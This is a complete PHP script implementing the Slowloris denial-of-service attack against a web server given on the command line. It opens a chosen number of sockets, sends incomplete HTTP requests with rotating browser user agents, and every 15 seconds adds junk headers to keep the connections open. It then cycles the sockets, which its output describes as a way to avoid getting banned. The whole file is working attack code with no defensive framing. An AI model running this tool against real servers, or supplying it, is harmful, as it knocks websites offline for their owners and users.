#!/usr/bin/php
<?php

$host = @$argv[1]=='-h' ? @$argv[2]: die("Usage Example:: php slowLoris.php -h example.com -p 80 -s 200\n");
$port = (@$argv[3]=='-p') ? @$argv[4] : "80" ;
$no_of_sockets = (@$argv[5]=='-s') ? @$argv[6] : "200" ;

if(!$port){
    die("Please Make sure you entered correct port");
}
if(!$no_of_sockets){
    die("Please Make sure you entered correct number of sockets");
}


(new SlowLoris($host,$port,$no_of_sockets))->initalize_attack();


class SlowLoris{
    private $host;

    private $port;

    private $no_of_sockets;

    private $socket_list = [];

    private $user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ];

    public function __construct($host,$port,$no_of_sockets)
    {
        $this->host = $host;
        $this->port = $port;
        $this->no_of_sockets = $no_of_sockets;
    }

    public function initalize_attack()
    {
        echo "Attacking $this->host : $this->port with $this->no_of_sockets socket\n";
        echo "Creating Sockets...\n";
        $this->create_sockets($this->no_of_sockets);

        $time=0;
        while ($time<120) {
            echo "Sending custom headers,to keep sockets alive...Socket Count ".count($this->socket_list)."\n";
            for ($i=0;$i<count($this->socket_list);$i++) {
                if (!@socket_write($this->socket_list[$i], "X-a:".rand(0, 2000)."\r\n")) {
                    array_splice($this->socket_list, $i);
                }
            }

            if(count($this->socket_list)<$this->no_of_sockets) {
                $socket = $this->init_socket();
                $this->socket_list[] = $socket;
            }

            $time += 15;
            sleep(15);
        }

        $this->close_sockets_And_start_again();
    }

    protected function create_sockets($no_of_sockets){
        for ($i=0;$i<$no_of_sockets;$i++) {
            $socket = $this->init_socket();
            if(!$socket){
                echo "Couldn't Init Socket no $i \n";
                continue;
            }
            $this->socket_list[] = $socket;
        }
    }

    protected function init_socket(){
        $socket = socket_create(AF_INET, SOCK_STREAM, 0);
        if(!$socket){
            return false;
        }

        // set_time_limit(4);
        $result = @socket_connect($socket, $this->host, $this->port);
        if(!$result){
            return false;
        }

        socket_write($socket, 
            "GET /?" . rand(0,2000) . "HTTP/1.1\r\n".
            "User-Agent:" . $this->user_agents[array_rand($this->user_agents)] ."\r\n".
            "{Accept-language: en-US,en,q=0.5}\r\n".
            "Connection: Keep-Alive\r\n"
        );

        return $socket;
    }

    protected function close_sockets_and_start_again()
    {
        echo "Closing Sockets and starting again not to get band \n";
        
        foreach($this->socket_list as $socket){
            socket_close($socket);
        }
        
        $this->socket_list = [];

        $this->initalize_attack();
    }
}


?>